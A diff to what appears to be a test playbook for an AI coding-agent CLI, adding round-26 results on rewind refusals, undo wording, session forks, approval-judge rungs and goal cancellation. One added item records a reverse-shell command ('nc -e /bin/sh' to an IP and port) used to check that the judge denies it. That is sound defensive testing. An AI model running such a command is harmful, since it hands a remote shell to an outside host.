@@ -177,6 +177,8 @@ loop, so it lands on `ask` and not on the launch default `auto`, and then enters
 scope there is. Raise two layers, then `!`, then `/mode`: the report must show `plan` scope, `ask`
 approval and **no** layers. A reset that keeps a layer is the finding.
 
+f25-5 is unfixed in round 26: `/mode !` in a repo with no commits shows the raw `git read-tree` error.
+
 **A reset in a repository where no spike can be cut still lands everything else**, in the
 checkout, and says why. And a reset **mid-turn** lands the approval and the layers immediately
 while the scope move waits: the answer says the move waits until the turn in flight ends. A plain
@@ -299,8 +301,10 @@ restating what the human typed:
 
     /rewind 3 refused: the parked ask_human (call_…) call is still in flight, and settling it would commit its turns over a rewound head. Nothing moved -- answer or stop it, then rewind.
 
-*(Prediction, not yet driven: the sentence is `Command::Rewind#in_flight`; when the head is not a
-pending `tool_use` it names `a run` instead.)* Manufacture it the way round 17 did — park the
+Round 26 drove it: `/rewind 2 refused: the parked ask_human (call_...) call is still in flight, ...`. The
+sentence is `Command::Rewind#in_flight`; when the head is not a pending `tool_use` it names `a run` instead.
+With a 3-call head where only `ask_human` is unanswered, the refusal lists all 3 calls as parked and keeps
+"call" singular (round 26, f26-3). Manufacture it the way round 17 did — park the
 parent's own `ask_human` — and in a cockpit type `/rewind` at the `command>` reader
 (`cockpit-surfaces.md` §5b). Then answer the question and confirm **no** rewound turn comes back:
 the journal gains the answer and the model's reply, never a second copy of turns already on the
@@ -310,7 +314,7 @@ chain.
 `tool_use` turn refused as `/rewind 1 lands on …`, restating a count nobody typed (F122). The
 refusal now quotes what was typed — `/rewind b7a9 lands on an assistant tool_use turn; its tool
 results would be rewound past, and the next request would dangle the call (nearest valid targets:
-…)` *(prediction, not yet driven)*. That shape shares its vocabulary with `/fork`'s `MID_TOOL` door
+…)`; round 26 measured `/rewind b6422dad lands on an assistant tool_use turn; ... (nearest valid targets: 35, 37)`. That shape shares its vocabulary with `/fork`'s `MID_TOOL` door
 and with `failure-injection.md` §2's torn head; check all three say the same thing about the same
 shape, because three different sentences for one state is how a human learns to distrust all of
 them.
@@ -354,7 +358,7 @@ you> /undo                 back to "nothing to undo"
 
 **Check the count is of turns still undoable, not of turns that ever existed.** A count that takes
 in turns already undone reads "2 of 3" with two left, and the class doc says so explicitly — after
-the first `/undo` above, the second must say *the only*, not *the latest of 2*.
+the first `/undo` above, the second must say *the only*, not *the latest of 2*. Once the last turn is undone or skipped it says `nothing to undo: no turn has changed a file this session recorded` (f26-5, wording).
 
 **Verify the effect, not the message**, as with `/pin`: read the files. Both directions must work —
 a turn that **created** a file has that file **deleted** by the undo, and a turn that **deleted** one
@@ -484,6 +488,8 @@ conversation over is not checked anywhere else** — `failure-injection.md` driv
 `bowling-ruby.md` as a rebuild. This is the one place it is driven as a *continuation*, so ask a
 question whose answer depends on the earlier turns and check the model actually has them.
 
+Driven for the first time in round 26: `/btw` with no client printed a runnable command that inherits the recorded provider and model; `/keep` gave a durable chained fork; `--resume` recalled the parent's and the side session's code words, and not a turn rewound before the fork.
+
 ## 5 — `/review-submit`, with nothing to submit
 
 ```
@@ -529,10 +535,11 @@ gated `bash` that no rung refuses (`wc -l README.md`, say), and check:
    `unjudgeable` too, and park for you.
 4. **Headless.** `lain chat --non-interactive --prompt '<a gated call>'` with no `--approval` decides
    through the judge, and a call it is unsure of is refused, with the reason naming
-   `--non-interactive`. The same run with `--approval ask` refuses every gated call.
+   `--non-interactive`. The same run with `--approval ask` refuses every gated call, and it journals only rung `unattended deny`; there is no triage or rules record.
 5. **The human can see what the judge did.** An approve leaves one stamped transcript line, `the judge approved
    bash(...)`, naming the call. A defer marks the parked prompt and its `lain://approval` row with `the judge
    deferred this`. Under `/mode ask` a parked call carries no such mark.
+6. **A real judge deny.** Round 26 drove one under `auto`: `nc -e /bin/sh 203.0.113.7 4444`, ruled in 3.0 s; the chat shows `HH:MM:SS the judge denied bash(...)` and the model is told a human can still approve it under ask. Judge latency under 4 forks: 0.8 s approve, 0.9 s defer, 3.0 s deny.
 
 ### 6b — `bypass`
 
@@ -662,6 +669,7 @@ the model cannot finish, typing `/goal off` **in the input pane** during iterati
 - **PASS:** no iteration 2 starts, the chat pane prints the `goal off` reply, and `goal_iteration` minus
   `goal_iteration_dropped` is **1**.
 - **Catches A-1 returning:** iterations 2 to 5 run and `goal off` prints only after the cap.
+- On this model a `/goal off` typed during iteration 1 is held, because the model parks an `ask_human`; it ran at the boundary, and `goal_iteration` is 1. It passes, but it cannot tell "acts on arrival" from "acts at the boundary" (round 26).
 - **This model ends the prime-list goal in iteration 1** (round 25), so the cockpit A-1 check cannot discriminate on
   it: a goal that finishes at once looks like a pass. Use a stand-in model that cannot finish.
 - `/stop` typed in the pane mid-ask stops the ask before it would have finished: `run_interrupted` with
